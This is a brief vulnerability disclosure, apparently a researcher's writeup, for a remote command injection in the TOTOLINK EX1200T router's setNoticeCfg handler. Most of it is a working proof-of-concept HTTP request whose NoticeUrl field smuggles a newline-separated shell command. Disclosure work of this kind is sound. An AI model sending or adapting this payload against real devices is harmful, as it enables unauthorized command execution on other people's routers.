# TOTOLINK EX1200T RCE

## Remote Command Injection Vulnerability Description

PRODUCT: TOTOLINK EX1200T V4.1.2cu.5215 (latest version)

There is a remote command injection in the function `setNoticeCfg` of the file `lib/cste_modules/system.so` , we can control the`NoticeUrl` to attack.

![image-20211019163049490](https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211019163049490.png)

## PoC

```
POST /cgi-bin/cstecgi.cgi?action=1 HTTP/1.1
Host: 192.168.0.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8
If-Modified-Since: Thu, 01 Jan 1970 00:00:03 GMT
Connection: close
Content-Length: 68

{"topicurl":"setNoticeCfg",
"NoticeEnabled":"1",
"NoticeUrl":"1.1.1.1\nps>/web_cste/test1\necho",
"BtnName":"Click here to continue",
"IpFrom":"1.1.1.1",
"IpTo":"1.1.1.1",
"NoticeTimeoutVal":"120"
}
```

![image-20211019162919271](https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211019162919271.png)
